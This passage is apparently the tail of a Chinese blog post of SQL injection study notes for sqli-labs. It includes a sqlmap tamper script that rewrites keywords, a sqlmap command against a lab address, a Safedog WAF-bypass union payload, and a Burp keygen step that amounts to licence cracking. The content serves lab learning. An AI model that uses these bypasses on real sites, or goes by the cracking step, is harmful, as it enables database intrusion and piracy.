+<h2 id="6-参数污染："><a href="#6-参数污染：" class="headerlink" title="6.参数污染："></a>6.参数污染：</h2><p>?p&#x3D;usa&amp;p&#x3D;china<br>百度1<br>雅虎2<br>google 1+2<br>php&#x2F;apache 2<br>flask 1<br>jsp&#x2F;tomcat 1<br>CGI&#x2F;apache 1<br>python&#x2F;apache 1+2<br>asp&#x2F;iis </p>
+<p>以php页面为例，传入?id&#x3D;1&amp;?id&#x3D;2网页过滤掉前面的id&#x3D;1，接收后面的id&#x3D;2，从而绕过了过滤规则。</p>
+<h2 id="7-tamper脚本编写："><a href="#7-tamper脚本编写：" class="headerlink" title="7.tamper脚本编写："></a>7.tamper脚本编写：</h2><p>脚本（以less-26a为例）：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload= payload.lower()</span><br><span class="line">    payload= payload.replace(<span class="string">&#x27;or&#x27;</span> , <span class="string">&#x27;oorr&#x27;</span>)  <span class="comment">#绕过or过滤</span></span><br><span class="line">    payload= payload.replace(<span class="string">&#x27;and&#x27;</span> , <span class="string">&#x27;anandd&#x27;</span>)  <span class="comment">#绕过and过滤</span></span><br><span class="line">    payload= payload.replace(<span class="string">&#x27; &#x27;</span> , <span class="string">&#x27;%0B&#x27;</span>)   <span class="comment">#绕过空格过滤</span></span><br><span class="line">    retVal=payload</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure></div>
+
+<p>把脚本放在&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;</p>
+<p>使用kali linux 中的sqlmap进行注入<code>sqlmap -u &quot;http://192.168.2.39/sqli/Less-26a/?id=1&quot; -v 3 --tamper=2 --dbs</code>  –tamper&#x3D;修改的python脚本文件名</p>
+<h2 id="8-安全狗WAF绕过（less1为例）："><a href="#8-安全狗WAF绕过（less1为例）：" class="headerlink" title="8.安全狗WAF绕过（less1为例）："></a>8.安全狗WAF绕过（less1为例）：</h2><ul>
+<li>用yakit进行发包处理，判断过滤掉了哪些闭合</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/liuweisongg/picture@main//imgAnQuanGouyakit.png"
+                     
+                ></p>
+<ul>
+<li>通过测试发现数字可能会绕过WAF，利用yakit进行五位随机数字发包</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/liuweisongg/picture@main//imgAnQuanGousuijishuzi.png"
+                     
+                ></p>
+<ul>
+<li>得出00044会绕过过滤规则，则传入语句为</li>
+</ul>
+<p><code>?id=0&#39;union/*//*//*!00044select*/1,/*//*//*!database*//*//*//*!00044()*/,3-- -</code></p>
+<p>常见绕过的参考文章:</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.51cto.com/u_15072903/4074643" >https://blog.51cto.com/u_15072903/4074643 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1849607" >https://cloud.tencent.com/developer/article/1849607 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="9-Oracle-简单了解"><a href="#9-Oracle-简单了解" class="headerlink" title="9.Oracle(简单了解)"></a>9.Oracle(简单了解)</h2><p>靶场地址：<a class="link"   target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" >https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="10-Burp安装和使用"><a href="#10-Burp安装和使用" class="headerlink" title="10.Burp安装和使用"></a>10.Burp安装和使用</h2><ul>
+<li>安装java19，在burp的文件目录下cmd进入命令行，输入<code>java -jar burp-loader-keygen-2_1_06.jar</code></li>
+<li>运行汉化.bat文件，交替复制粘贴key，手动激活</li>
+<li>利用BP抓包<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/liuweisongg/picture@main//imgBPzhubao.png"
+                      style="zoom: 67%;" 
+                ></li>
+<li>使用方法与yakit类似，在Orcel靶场有相关训练</li>
+</ul>
+<h1 id="sql注入教程参考文章：https-www-yuque-com-sunwu-pbywz-iwogk6-fs49ainr05gsxb5h-singleDoc"><a href="#sql注入教程参考文章：https-www-yuque-com-sunwu-pbywz-iwogk6-fs49ainr05gsxb5h-singleDoc" class="headerlink" title="sql注入教程参考文章：https://www.yuque.com/sunwu-pbywz/iwogk6/fs49ainr05gsxb5h?singleDoc#"></a>sql注入教程参考文章：<a class="link"   target="_blank" rel="noopener" href="https://www.yuque.com/sunwu-pbywz/iwogk6/fs49ainr05gsxb5h?singleDoc#" >https://www.yuque.com/sunwu-pbywz/iwogk6/fs49ainr05gsxb5h?singleDoc# <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h1>
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 12月20日——sql注入</li>
+        <li><strong>Author:</strong> 刘伟松</li>
+        <li><strong>Created at
+                :</strong> 2023-12-20 16:20:27</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-01-08 21:32:07
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2023/12/20/12月20日——sql注入/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+            This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+            
+
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2023/12/25/mysql/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item"></span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/12/17/12%E6%9C%8815%E6%97%A5%E2%80%94%E2%80%94%E7%BC%96%E5%86%99%E9%A1%B5%E9%9D%A2/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">12月15日——编写页面</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+ 
+    <div id="waline"></div>
+    <script type="module"  data-swup-reload-script>
+        import { init } from '/js/libs/waline.mjs';
+
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://example.example.com',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+            });
+        }
+
+        if ('true') {
+            const loadWalineTimeout = setTimeout(() => {
+                loadWaline();
+                clearTimeout(loadWalineTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadWaline);
+        }
+        
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">12月20日——sql注入</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81sql%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="nav-text">一、sql注入语句</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E4%BD%BF%E7%94%A8%E7%8E%AF%E5%A2%83"><span class="nav-text">1.使用环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%89%80%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="nav-text">2.所用语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-sqli%E9%97%AF%E5%85%B3"><span class="nav-text">3.sqli闯关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3%EF%BC%9A"><span class="nav-text">第一关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3%EF%BC%9A"><span class="nav-text">第二关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3%EF%BC%9A"><span class="nav-text">第三关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3%EF%BC%9A"><span class="nav-text">第四关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3%EF%BC%88%E6%8A%A5%E9%94%99%E5%9B%9E%E6%98%BE%EF%BC%89%EF%BC%9A"><span class="nav-text">第五关（报错回显）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%85%AD%E5%85%B3%EF%BC%9A"><span class="nav-text">第六关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%83%E5%85%B3%EF%BC%9A"><span class="nav-text">第七关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%85%AB%E5%85%B3%EF%BC%9A"><span class="nav-text">第八关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B9%9D%E5%85%B3%EF%BC%9A"><span class="nav-text">第九关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E5%85%B3%EF%BC%9A"><span class="nav-text">第十关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E5%85%B3%EF%BC%9A"><span class="nav-text">第十一关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%85%B3%EF%BC%9A"><span class="nav-text">第十二关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3%EF%BC%9A"><span class="nav-text">第十三关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3%EF%BC%9A"><span class="nav-text">第十四关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3%EF%BC%9A"><span class="nav-text">第十五关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E5%85%AD%E5%85%B3%EF%BC%9A"><span class="nav-text">第十六关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%83%E5%85%B3%EF%BC%9A"><span class="nav-text">第十七关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E5%85%AB%E5%85%B3%EF%BC%9A"><span class="nav-text">第十八关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%B9%9D%E5%85%B3"><span class="nav-text">第十九关:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3%EF%BC%9A"><span class="nav-text">第二十关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3"><span class="nav-text">第二十一关:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3%EF%BC%9A"><span class="nav-text">第二十二关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%89%E5%85%B3%EF%BC%9A"><span class="nav-text">第二十三关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%9B%9B%E5%85%B3"><span class="nav-text">第二十四关:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%EF%BC%88or%E8%BF%87%E6%BB%A4%EF%BC%89%EF%BC%9A"><span class="nav-text">第二十五关（or过滤）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%EF%BC%9A"><span class="nav-text">第二十六关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E5%8D%81%E5%85%ADa%EF%BC%9A"><span class="nav-text">二十六a：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3%EF%BC%9A"><span class="nav-text">二十七关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%EF%BC%9A"><span class="nav-text">第二十八关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E5%8D%81%E4%B9%9D%E5%85%B3%EF%BC%88http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%EF%BC%89"><span class="nav-text">二十九关（http参数污染）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%B3%EF%BC%9A"><span class="nav-text">第三十关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3%EF%BC%9A"><span class="nav-text">第三十一关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3%EF%BC%88%E5%AE%BD%E5%AD%97%E8%8A%82%E7%AC%A6%EF%BC%89%EF%BC%9A"><span class="nav-text">第三十二关（宽字节符）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E5%85%B3%EF%BC%9A"><span class="nav-text">第三十三关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E5%85%B3%EF%BC%9A"><span class="nav-text">第三十四关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3%EF%BC%9A"><span class="nav-text">第三十五关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3%EF%BC%9A"><span class="nav-text">第三十六关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3%EF%BC%9A"><span class="nav-text">第三十七关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AB%E5%85%B3-%E5%8F%AF%E4%BB%A5%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%EF%BC%9A"><span class="nav-text">第三十八关(可以堆叠注入)：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E5%85%B3%EF%BC%9A"><span class="nav-text">第三十九关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%B3"><span class="nav-text">第四十关:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%80%E5%85%B3%EF%BC%9A"><span class="nav-text">第四十一关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E5%85%B3%EF%BC%9A"><span class="nav-text">第四十二关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E5%85%B3%EF%BC%9A"><span class="nav-text">第四十三关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E5%85%B3%EF%BC%9A"><span class="nav-text">第四十四关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3%EF%BC%9A"><span class="nav-text">第四十五关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E5%85%B3%EF%BC%9A"><span class="nav-text">第四十六关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%85%B3"><span class="nav-text">第四十七关;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E5%85%B3"><span class="nav-text">第四十八关:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%85%B3%EF%BC%9A"><span class="nav-text">第四十九关：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%B3%EF%BC%9A"><span class="nav-text">第五十关：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-webshell"><span class="nav-text">4.webshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E5%AE%BD%E5%AD%97%E8%8A%82%E7%AC%A6%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="nav-text">5.宽字节符注入：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%EF%BC%9A"><span class="nav-text">6.参数污染：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-tamper%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%EF%BC%9A"><span class="nav-text">7.tamper脚本编写：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-%E5%AE%89%E5%85%A8%E7%8B%97WAF%E7%BB%95%E8%BF%87%EF%BC%88less1%E4%B8%BA%E4%BE%8B%EF%BC%89%EF%BC%9A"><span class="nav-text">8.安全狗WAF绕过（less1为例）：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-Oracle-%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3"><span class="nav-text">9.Oracle(简单了解)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-Burp%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8"><span class="nav-text">10.Burp安装和使用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9Ahttps-www-yuque-com-sunwu-pbywz-iwogk6-fs49ainr05gsxb5h-singleDoc"><span class="nav-text">sql注入教程参考文章：https:&#x2F;&#x2F;www.yuque.com&#x2F;sunwu-pbywz&#x2F;iwogk6&#x2F;fs49ainr05gsxb5h?singleDoc# </span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">刘伟松</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
